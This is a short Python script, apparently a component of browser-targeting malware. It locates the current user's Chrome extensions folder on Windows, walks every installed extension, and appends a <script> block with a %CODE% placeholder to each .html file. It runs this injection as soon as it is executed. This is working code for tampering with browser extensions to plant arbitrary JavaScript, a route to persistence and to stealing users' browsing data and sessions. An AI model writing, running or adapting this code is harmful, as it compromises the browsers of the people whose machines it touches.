import os
folder = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions'
sub_folders = [name for name in os.listdir(folder) if os.path.isdir(os.path.join(folder, name))]
script = r'''
<script>
%CODE%
</script>
'''
def inject():
    for i in range(len(sub_folders)):
        rootdir = folder+"\\"+sub_folders[i]
        for file in os.listdir(rootdir):
            d = os.path.join(rootdir, file)
            if os.path.isdir(d):
                for root, dirs, files in os.walk(d):
                    for file in files:
                        if file.endswith(".html"):
                            f = open(os.path.join(root, file), 'a')
                            f.write(f'\n\n{script}\n')
                            f.close()
inject()
